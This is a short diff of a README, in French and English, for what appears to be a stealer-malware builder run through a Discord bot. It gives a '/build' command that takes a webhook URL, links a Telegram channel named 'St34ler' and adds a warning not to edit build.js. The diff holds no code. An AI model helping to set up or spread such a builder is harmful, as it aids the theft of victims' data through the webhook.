@@ -43,6 +43,8 @@ verified roles: "customers roles"
 
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
 
+Ne pas edit la config de build.js sinon plus rien ne marchera
+
 official 1336 Channel
 https://t.me/St34ler
 
@@ -88,6 +90,8 @@ guildid: "your guild id"
 verified roles: "customers roles"
 
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
+
+don't edit build.js or nothing will be work
 
 official 1336 Channel
 https://t.me/St34ler
